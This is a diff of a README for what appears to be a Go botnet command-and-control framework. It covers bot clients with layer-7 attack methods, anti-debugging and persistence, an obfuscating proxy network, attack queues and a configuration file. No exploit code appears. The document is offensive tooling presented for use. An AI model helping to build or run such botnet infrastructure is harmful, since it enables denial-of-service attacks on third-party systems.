@@ -2,7 +2,7 @@
 
 >  * This will combind both my projects Gostress-V2 + BotnetGo together hopefully making one big C2 Framework with a REST API on web dashboard + terminal supporting openssl TLS 1.3 Enfored + Trusted. As well as a P2P Proxy that Supports hidden Bidirectional comminication and Load-Balancing for the C2.
 
->  * A Tor implementation of this project Will NOT be implemented as of now.
+>  * A Tor implementation of this project will be implemented in the future.
 
 ![Go Version](https://img.shields.io/badge/go-1.21+-blue.svg)
 [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
@@ -20,20 +20,20 @@ A sophisticated Command and Control (C2) server with enterprise-grade features f
 ### OverView Of Entire Project 
 | Component       | Status        | Current Progress | Improvements to be Added / Implemented |
 |-----------------|--------------|------------------|-----------------------|
-| **C2 Server**   | Functional   | 80% Complete ✅  | - Implement Gosstress-V2 Web Dashboard<br>- Develop REST API endpoints<br>- Enhance command queuing system |
-| **Client**      | In Development | 58% Complete ❌ | - Expand L7 attack methods<br>- Improve connection stability<br>- Research persistence mechanisms (potential future GOFloodV2 integration) |
-| **Proxy Network** | Testing Phase | 75% Complete ⚠️ | - Comprehensive testing to make sure it secure<br>- Dashboard security hardening<br>- Load balancing optimization<br>- Peer synchronization verification |
+| **C2 Server**   | Functional   | 80% Complete 🟠  | - Implement Gosstress-V2 Web Dashboard<br>- Develop REST API endpoints<br>- Enhance command queuing system |
+| **Client**      | In Development | 84% Complete 🟠 | - Expand L7 attack methods<br>- Improve connection stability<br>- More persistence mechanisms (potentially a future  integration) |
+| **Proxy Network** | Testing Phase | 95% Complete ⚠️ | - Comprehensive testing to make sure it secure<br>- Dashboard security hardening<br>-<br>- synchronization verification |
 
 
 ### Core Components
 | File          | Status       | Improvements Made                                                                 |
 |---------------|-------------|-----------------------------------------------------------------------------------|
-| `main.go`   C2 Server File  | ❌ Needs Work  | - Enhanced TLS 1.3 configuration<br>- Added TOTP authentication<br>- Improved attack queue system |
+| `main.go`   C2 Server File  | ❌ Needs Work  | - Enhanced TLS 1.3 configuration<br>-<br>- Improved attack queue system |
 | `bot.go`    Client File   | ⚠️ Partial   | - Added anti-debugging checks<br>- Improved persistence mechanism<br>- Enhanced stats reporting |
+| `proxy.go`  Proxy File| 🟠 Just Improvements | - Bidirectional TLS 1.3<br>- Traffic monitoring dashboard<br>- |
 | `README.md`  Readme.md File| ⚠️ Partial  | - Restructured documentation<br>- Added demo video placeholders<br>- Needs final polish |
-| `proxy.go`  Proxy File| 🟠 Just Improvements | - Bidirectional TLS 1.3<br>- Traffic monitoring dashboard<br>- P2P load balancing |
 
-### Support Scripts
+### Support Scripts 
 | File                     | Status       | Key Features                                                                      |
 |--------------------------|-------------|-----------------------------------------------------------------------------------|
 | `generate_certs.sh`  Certificates Gen  File  | ✅ Complete  | - 4096-bit key generation<br>- SAN support for IP/DNS<br>- Proper file permissions |
@@ -42,29 +42,29 @@ A sophisticated Command and Control (C2) server with enterprise-grade features f
 
 ## 🛠️ Technical Architecture
 ```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   C2 Server     │    │   Proxy Network │    │   Bot Clients   │    │   Target Host   │
-│                 │    │                 │    │                 │    │                 │
-│  - User Auth    │◄───┤  - Load Balance │◄───┤  - Auto-Connect │    │                 │
-│  - Attack Queue │    │  - Traffic Obf  │    │  - Attack Exec  │───►│  - Under Attack │
-│  - Logging      │───►│  - Peer Sync    │───►│  - Stats Report │    │                 │
-└───────┬─────────┘    └───────┬─────────┘    └─────────────────┘    └─────────────────┘
+                          
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐    
+│   C2 Server     │    │   Proxy  Client │    │   Bot Clients   │    ┌─────────────────┐
+│  - User Auth    │    │  - Load Balance │    │  - Auto-Connect │    │   Target Host   │
+│  - Attack Queue │───►│  - Traffic Obf  │◄───┤  - Attack Exec  │───►│  - Under Attack │
+│  - Logging      │◄───│  - TLS 1.3      │───►│  - Stats Report │    └─────────────────┘
+└───────┬─────────┘    └───────┬─────────┘    └─────────────────┘    
         │                      │
         ▼                      ▼
 ┌─────────────────┐    ┌─────────────────┐
-│ Admin Dashboard │    │   Peer Nodes    │
+│ Admin Dashboard │    │ Proxy Dashboard │
 │  - Attack Queue │    │ - Traffic stats │
-│  - Real-time    │    │ - Relay         │
-│  - Monitoring   │◄───┤ - Failover      │
-│  - Config Edits │    │ - Health Check  │
-│  - User Auth    │    └─────────────────┘   
+│  - Real-time    │───►│ - Relay         │
+│  - Monitoring   │◄───┤ - Health Check  │
+│  - Config Edits │    └─────────────────┘ 
+│  - User Auth    │      
 └─────────────────┘ 
 ```
 
 ## ✨ Key Features
 
 - **Military-Grade Encryption**: TLS 1.3 with mutual authentication
-- **Advanced Authentication**: TOTP 2FA, bcrypt password hashing
+- **Advanced Authentication**: Bcrypt password hashing
 - **Real-time Monitoring**: Live bot statistics and attack analytics
 - **Attack Management**: Queue system with priority scheduling
 - **Multi-Architecture Support**: Cross-platform bot clients
@@ -76,7 +76,7 @@ A sophisticated Command and Control (C2) server with enterprise-grade features f
 ### Prerequisites
 - Go 1.20+
 - OpenSSL for certificate generation
-- Linux server (recommended)
+- Linux server (Recommended)
 
 ### Installation
 ```bash
@@ -94,7 +94,6 @@ chmod +x build.sh
 # Start server
 ./cnc
 ```
-
 
 ## 🎥 Video Demonstrations
 
@@ -118,14 +117,14 @@ Edit `config.json` to customize settings:
   "audit_log_file": "audit.log",
   "bot_server_ip": "0.0.0.0",
   "user_server_ip": "0.0.0.0",
-  "bot_server_port": "7002",
-  "user_server_port": "7001",
-  "cert_file": "certs/server.pem",
+  "bot_server_port": "1337",
+  "user_server_port": "1338",
+  "cert_file": "certs/server.crt",
   "key_file": "certs/server.key",
-  "session_timeout": "30m",
+  "session_timeout": 3600000000000,
   "max_conns": 1000,
   "max_read_size": 4096,
-  "max_log_size": 104857600,
+  "max_log_size": 10485760,
   "max_queued_attacks": 50,
   "max_daily_attacks": 100,
   "max_attack_duration": 3600,
@@ -133,7 +132,16 @@ Edit `config.json` to customize settings:
   "min_password_length": 8,
   "password_complexity": true,
   "max_connections_per_ip": 5,
-  "totp_enabled": true
+  "ddos_protection": true,
+  "max_conn_rate": 10,
+  "syn_flood_threshold": 100,
+  "reset_token_validity": 3600000000000,
+  "pinned_cert_file": "certs/pinned.crt",
+  "command_signing_key": "your-secure-signing-key-here",
+  "geo_distributed": false,
+  "node_id": "node1",
+  "node_secret": "your-node-secret-here",
+  "peer_nodes": ["node2.example.com:1337", "node3.example.com:1337"]
 }
 ```
 
